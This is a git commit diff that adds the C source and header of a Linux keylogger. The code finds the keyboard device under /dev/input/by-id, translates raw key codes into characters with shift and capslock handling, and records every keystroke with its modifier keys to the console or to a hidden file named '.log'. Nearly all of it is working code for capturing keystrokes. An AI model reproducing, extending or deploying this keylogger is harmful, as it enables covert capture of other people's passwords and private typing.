9c85d379f92e0066d65f049b72b924c1d45ec2ed
ryhkml <reyhank95@hotmail.com>
2025-01-07 17:47:05 +0700

    Optimize code

---
+++ keylogger.c
@@ -0,0 +1,139 @@
+#include "keylogger.h"
+
+#include <dirent.h>
+#include <linux/input-event-codes.h>
+#include <stdio.h>
+#include <string.h>
+
+const KeyMap key_map[] = {
+    [KEY_A] = {"a", "A"},
+    [KEY_B] = {"b", "B"},
+    [KEY_C] = {"c", "C"},
+    [KEY_D] = {"d", "D"},
+    [KEY_E] = {"e", "E"},
+    [KEY_F] = {"f", "F"},
+    [KEY_G] = {"g", "G"},
+    [KEY_H] = {"h", "H"},
+    [KEY_I] = {"i", "I"},
+    [KEY_J] = {"j", "J"},
+    [KEY_K] = {"k", "K"},
+    [KEY_L] = {"l", "L"},
+    [KEY_M] = {"m", "M"},
+    [KEY_N] = {"n", "N"},
+    [KEY_O] = {"o", "O"},
+    [KEY_P] = {"p", "P"},
+    [KEY_Q] = {"q", "Q"},
+    [KEY_R] = {"r", "R"},
+    [KEY_S] = {"s", "S"},
+    [KEY_T] = {"t", "T"},
+    [KEY_U] = {"u", "U"},
+    [KEY_V] = {"v", "V"},
+    [KEY_W] = {"w", "W"},
+    [KEY_X] = {"x", "X"},
+    [KEY_Y] = {"y", "Y"},
+    [KEY_Z] = {"z", "Z"},
+    [KEY_0] = {"0", ")"},
+    [KEY_1] = {"1", "!"},
+    [KEY_2] = {"2", "@"},
+    [KEY_3] = {"3", "#"},
+    [KEY_4] = {"4", "$"},
+    [KEY_5] = {"5", "%"},
+    [KEY_6] = {"6", "^"},
+    [KEY_7] = {"7", "&"},
+    [KEY_8] = {"8", "*"},
+    [KEY_9] = {"9", "("},
+    [KEY_SPACE] = {"Space", "Space"},
+    [KEY_ENTER] = {"Enter", "Enter"},
+    [KEY_BACKSPACE] = {"Backspace", "Backspace"},
+    [KEY_TAB] = {"Tab", "Tab"},
+    [KEY_ESC] = {"Esc", "Esc"},
+    [KEY_COMMA] = {",", "<"},
+    [KEY_DOT] = {".", ">"},
+    [KEY_SLASH] = {"/", "?"},
+    [KEY_SEMICOLON] = {";", ":"},
+    [KEY_APOSTROPHE] = {"'", "\""},
+    [KEY_LEFTBRACE] = {"[", "{"},
+    [KEY_RIGHTBRACE] = {"]", "}"},
+    [KEY_MINUS] = {"-", "_"},
+    [KEY_EQUAL] = {"=", "+"},
+    [KEY_GRAVE] = {"`", "~"},
+    [KEY_BACKSLASH] = {"\\", "|"},
+    [KEY_KPASTERISK] = {"*", "*"},
+    [KEY_KPPLUS] = {"+", "+"},
+    [KEY_KPMINUS] = {"-", "-"},
+    [KEY_KPDOT] = {".", "."},
+    [KEY_KP0] = {"KP_0", "KP_0"},
+    [KEY_KP1] = {"KP_1", "KP_1"},
+    [KEY_KP2] = {"KP_2", "KP_2"},
+    [KEY_KP3] = {"KP_3", "KP_3"},
+    [KEY_KP4] = {"KP_4", "KP_4"},
+    [KEY_KP5] = {"KP_5", "KP_5"},
+    [KEY_KP6] = {"KP_6", "KP_6"},
+    [KEY_KP7] = {"KP_7", "KP_7"},
+    [KEY_KP8] = {"KP_8", "KP_8"},
+    [KEY_KP9] = {"KP_9", "KP_9"},
+    [KEY_UP] = {"Arrow Up", "Arrow Up"},
+    [KEY_DOWN] = {"Arrow Down", "Arrow Down"},
+    [KEY_LEFT] = {"Arrow Left", "Arrow Left"},
+    [KEY_RIGHT] = {"Arrow Right", "Arrow Right"},
+    [KEY_CAPSLOCK] = {"CapsLock", "CapsLock"},
+};
+
+const char *get_key_name(int key_code, bool shift_pressed, bool capslock_active) {
+    if (key_code >= 0 && (size_t)key_code < sizeof(key_map) / sizeof(key_map[0]) && key_map[key_code].normal != NULL) {
+        if (key_code >= KEY_A && key_code <= KEY_Z) {
+            if (capslock_active != shift_pressed) {
+                return key_map[key_code].shifted;
+            }
+            return key_map[key_code].normal;
+        }
+        return shift_pressed ? key_map[key_code].shifted : key_map[key_code].normal;
+    }
+    return "UNKNOWN";
+}
+
+char *find_keyboard_device() {
+    DIR *dir;
+    struct dirent *ent;
+    static char keyboard_path[BUFFER_SIZE];
+
+    if ((dir = opendir("/dev/input/by-id")) == NULL) {
+        perror("Cannot access /dev/input/by-id");
+        return NULL;
+    }
+
+    while ((ent = readdir(dir)) != NULL) {
+        if (strstr(ent->d_name, "kbd") || strstr(ent->d_name, "keyboard")) {
+            if (strlen(ent->d_name) < (sizeof(keyboard_path) - strlen("/dev/input/by-id/") - 1)) {
+                strncpy(keyboard_path, "/dev/input/by-id/", sizeof(keyboard_path) - 1);
+                strncat(keyboard_path, ent->d_name, sizeof(keyboard_path) - strlen(keyboard_path) - 1);
+                keyboard_path[sizeof(keyboard_path) - 1] = '\0';  // Null-terminate
+                closedir(dir);
+                return keyboard_path;
+            } else {
+                fprintf(stderr, "Device name too long: %s\n", ent->d_name);
+            }
+        }
+    }
+
+    closedir(dir);
+    return NULL;
+}
+
+void log_key(FILE *fp, bool shift_pressed, bool ctrl_pressed, bool meta_pressed, bool alt_pressed, bool log_to_file,
+             const char *key_name) {
+    if (log_to_file) {
+        if (shift_pressed) fprintf(fp, "Shift + ");
+        if (ctrl_pressed) fprintf(fp, "Ctrl + ");
+        if (meta_pressed) fprintf(fp, "Meta + ");
+        if (alt_pressed) fprintf(fp, "Alt + ");
+        fprintf(fp, "%s\n", key_name);
+        fflush(fp);
+    } else {
+        if (shift_pressed) printf("Shift + ");
+        if (ctrl_pressed) printf("Ctrl + ");
+        if (meta_pressed) printf("Meta + ");
+        if (alt_pressed) printf("Alt + ");
+        printf("%s\n", key_name);
+    }
+}
---
+++ keylogger.h
@@ -0,0 +1,21 @@
+#ifndef KEYBOARD_LOGGER_H
+#define KEYBOARD_LOGGER_H
+
+#include <linux/input.h>
+#include <stdbool.h>
+#include <stdio.h>
+
+#define BUFFER_SIZE 256
+#define LOG_FILE ".log"
+
+typedef struct {
+    const char *normal;
+    const char *shifted;
+} KeyMap;
+
+const char *get_key_name(int key_code, bool shift_pressed, bool capslock_active);
+char *find_keyboard_device();
+void log_key(FILE *fp, bool shift_pressed, bool ctrl_pressed, bool meta_pressed, bool alt_pressed, bool log_to_file,
+             const char *key_name);
+
+#endif
